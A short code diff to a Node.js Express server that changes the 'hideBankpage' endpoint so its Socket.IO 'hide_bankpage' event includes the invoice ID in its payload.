@@ -184,6 +184,7 @@ app.post('/api/showBankpage', (req, res) => {
   res.json({ status: 'success' });
 });
 
+// server.js - Update the hideBankpage endpoint
 app.post('/api/hideBankpage', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
@@ -191,7 +192,7 @@ app.post('/api/hideBankpage', (req, res) => {
   
   txn.redirectStatus = null;
   txn.bankpageVisible = false;
-  io.to(invoiceId).emit('hide_bankpage');
+  io.to(invoiceId).emit('hide_bankpage', { invoiceId }); // Add invoiceId to payload
   res.json({ status: 'success' });
 });
 
